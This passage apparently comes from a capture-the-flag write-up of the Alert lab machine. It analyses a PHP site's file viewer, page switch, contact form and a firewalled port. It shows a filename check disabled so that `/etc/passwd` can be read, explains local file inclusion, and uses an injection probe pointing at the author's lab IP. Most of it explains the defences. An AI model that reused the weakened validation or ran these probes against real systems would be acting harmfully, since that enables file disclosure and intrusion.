        //if (preg_match('/^[a-zA-Z0-9_.-]+\.md$/', $filename)) {
            $filePath = $uploadDirectory . $filename;
            if (file_exists($filePath) && is_readable($filePath)) {
                require 'Parsedown.php';
                $parsedown = new Parsedown();
                echo $parsedown->text(file_get_contents($filePath));
            } else {
                echo "Error: Invalid file.";
            }
        /*} else {
            echo "Error: Invalid file name.";
        } */
    }

```

Now `/etc/passwd` loads just fine:

![image-20250320103123511](/img/image-20250320103123511.png)

### index.php page Parameter

#### Pre-root Thoughts

Much of the site is set up using a common (though relatively out of date in favor of frameworks like Laravel) PHP pattern where the `index.php` has the main template for the site with things like the header, footer, and nav bar, and then it uses the `include` keyword to bring in the page of the site that is visited based on a GET parameter.

This can be attacked because if the parameter is a filename, then there’s a good chance to get local file inclusion (LFI) if the input is not sanitized properly. In this case, the URL looks like `/index.php?page=contact`. One possibility is that there’s a `content.php` page on the filesystem, and then the PHP is running something like `include ($_GET['page'] . '.php')` to load it. I’ve exploited this pattern many times before.

Anything I try to put as the `page` parameter leads to this error:

![image-20250320103647933](/img/image-20250320103647933.png)

#### Source Analysis

After some HTML templating, the PHP code in `index.php` actually does a switch statement based on the input:

```

<?php
if (isset($_GET['page'])) {
    $page = $_GET['page'];

    switch ($page) {
        case 'alert':
...[snip]...
            break;
        case 'contact':
...[snip]...
            break;
        case 'about':
...[snip]...
            break;
        case 'messages':
            require 'messages.php';
            break;
        case 'donate':
...[snip]...
            break;
        default:
            echo '<h1>Error: Page not found</h1>';
            break;
    }
} else {
    header("Location: index.php?page=alert");
}
?>

```

All but `messages` uses `echo` to write the page from right here in the template. That is not super realistic, but regardless, this `switch` statement is very secure. There’s nothing I can do to access the wrong page here.

This page also shows that the `donate` page really does nothing. Completing the form sends a POST to `index.php?page=doante`, but that just returns the same page without doing anything:

```

        case 'donate':
            echo '<h1>Support Us</h1>';
            echo '<p>Your donation helps improve Markdown visualization, providing a better user experience for everyone.</p>';
            echo '<div class="form-container">
                    <form action="#" method="post">
                        <input type="number" name="amount" placeholder="Enter amount" required>
                        <input type="submit" value="Donate">
                    </form>
                  </div>';
            break;

```

### Direct XSS via Contact Form

#### Pre-root Thoughts

There’s a contact form, and elsewhere on the site it says that the admin is checking it regularly. That’s a good sign to try XSS. Typically I start with HTML injection. If the injection is not blind, I’ll write a `<b>test</b>` type tag, and see if it comes back bold. In this case it is blind, so I’ll try sending a simple image tag, like `<img src="http://10.10.14.6/img.png" />`. If that loads, then there will be a request to my webserver, and I’ll know that my input was processed as HTML. That’s a good start to building up to XSS.

Unfortunately for me, nothing I sent every inspired a connection back to me.

#### Source Code

`contact.php` handles POST requests when the contact message form are sent. It makes sure the request is a POST, and then gets the email and message:

```

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["email"]) && isset($_POST["message"])) {
        $email = filter_var($_POST["email"], FILTER_SANITIZE_EMAIL);
        $message = htmlspecialchars($_POST["message"]);

        $directory = "messages/";

        if (!file_exists($directory)) {
            mkdir($directory, 0777, true);
        }

        $filename = $directory . date("Y-m-d_H-i-s") . ".txt";

        file_put_contents($filename, "Email: " . $email . "\n\nMessage: " . $message);

        header("Location: http://alert.htb/index.php?page=contact&status=Message%20sent%20successfully!");
    } else {
        echo "Error: Email and message are required.";
    }
} else {
    echo "Error: Invalid request.";
}
?>

```

Both are pushed through different filters. `filter_var` [applies preconfigured](https://www.php.net/manual/en/function.filter-var.php) and custom filters, and the `FILTER_SANITIZE_EMAIL` is a safe way to limit the input to just an email.

For example:

```

oxdf@hacky$ php -a
Interactive shell
php > $input = '0xdf@alert.htb; <img src="http://10.10.14.6/img.src"/> test!@#$%^&*()_-/';
php > echo filter_var($input, FILTER_SANITIZE_EMAIL);
0xdf@alert.htbimgsrc=http10.10.14.6img.srctest!@#$%^&*_-

```

`htmlspecialchars` [takes special characters](https://www.php.net/manual/en/function.htmlspecialchars.php) that are meaningful in HTML and HTML-encodes them. For example:

```

php > $input = '<img src="http://10.10.14.6/img.png" />';
php > echo htmlspecialchars($input);
&lt;img src=&quot;http://10.10.14.6/img.png&quot; /&gt;

```

This prevents HTML injection.

### TCP 12227

#### Configuration

TCP port 12227 came back as filtered by `nmap`, but I never came back to it in exploiting the box.

As root, I can see there’s nothing listening on this port:

```

root@alert:~# netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      944/systemd-resolve 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1019/sshd: /usr/sbi 
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      1003/php            
tcp6       0      0 :::22                   :::*                    LISTEN      1019/sshd: /usr/sbi 
tcp6       0      0 :::80                   :::*                    LISTEN      1036/apache2  

```

There is an `iptables` firewall rule:

```

root@alert:~# iptables -L -v
Chain INPUT (policy ACCEPT 720K packets, 84M bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     tcp  --  lo     any     anywhere             anywhere             tcp dpt:12227
    6   264 DROP       tcp  --  any    any     anywhere             anywhere             tcp dpt:12227

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 792K packets, 195M bytes)
 pkts bytes target     prot opt in     out     source               destination  

```

IPTables rules apply from top to bottom until there’s a match. On input, any packet on the `lo` (localhost) interface to port 12227 is accepted. The next rule drops all traffic to 12227 on any interface.

At some point this port was configured so that it was only accessible from localhost. It could have been a step that was at one point on the box but later removed. It’s impossible to say for sure how it got there.

#### Filtered

The firewall rule at least explains why `nmap` reports the port as filtered. To see this in action, I’ll use `nc` to connect to a non-listening port (say 223) and port 12227 and see what’s different in Wireshark. When I run `nc alert.htb 223`, it looks like:

![image-20250321092616563](/img/image-20250321092616563.png)

It tries to start the TCP handshark with a SYN packet, and the server responds with a RST (reset) / ACK (acknowledge) packet, indicating that there’s nothing listening on this port.

When I do the same thing to port 12227, the same SYN packet goes out:

![image-20250321092759614](/img/image-20250321092759614.png)

But this time there’s no response from the server. Instead, `nc` tries several more times to send the same packet, each time with no response, before it gives up.

That’s because the firewall dropped the SYN packet before it got to the OS, so there’s no response.